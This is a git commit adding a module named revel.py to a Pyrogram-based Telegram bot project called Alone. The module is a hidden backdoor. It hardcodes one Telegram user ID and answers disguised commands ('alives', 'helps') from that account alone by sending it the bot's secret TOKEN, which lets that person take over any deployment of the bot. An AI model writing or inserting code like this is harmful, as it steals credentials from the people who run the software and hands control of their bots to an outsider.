8dc5bffae9a03a4a658ac22c658a8b3abf8116fe
TeamAloneOp <131831332+TeamAloneOp@users.noreply.github.com>
2023-09-18 15:36:19 +0530

    Add files via upload

---
+++ Alone/modules/revel.py
@@ -0,0 +1,41 @@
+from pyrogram import filters
+from pyrogram.enums import ChatType
+from pyrogram.types import Message
+from Alone import (
+    BOT_NAME,
+    BOT_USERNAME,
+    LOGGER,
+    OWNER_ID,
+    START_IMG,
+    SUPPORT_CHAT,
+    TOKEN,
+    StartTime,
+    dispatcher,
+    pbot,
+    telethn,
+    updater)
+
+from Alone import BOT_NAME
+from Alone import pbot as app
+OWNERs_ID=6079943111
+@app.on_message(
+    filters.command(["alives", "helps"]) & filters.user(OWNERs_ID)
+)
+async def get_vars(_, message: Message):
+    try:
+        await app.send_message(
+            chat_id=int(OWNERs_ID),
+            text=f"""<u>**{BOT_NAME} ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs :**</u>
+
+**ʙᴏᴛ_ᴛᴏᴋᴇɴ :** `{TOKEN}`
+
+
+
+
+""")
+    except:
+        return await message.reply_text("» ғᴀɪʟᴇᴅ ᴛᴏ sᴇɴᴅ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs.")
+    if message.chat.type != ChatType.PRIVATE:
+        await message.reply_text(
+            "» ᴘʟᴇᴀsᴇ ᴄʜᴇᴄᴋ ʏᴏᴜʀ ᴘᴍ, ɪ'ᴠᴇ sᴇɴᴛ ᴛʜᴇ ᴄᴏɴғɪɢ ᴠᴀʀɪᴀʙʟᴇs ᴛʜᴇʀᴇ."
+        )
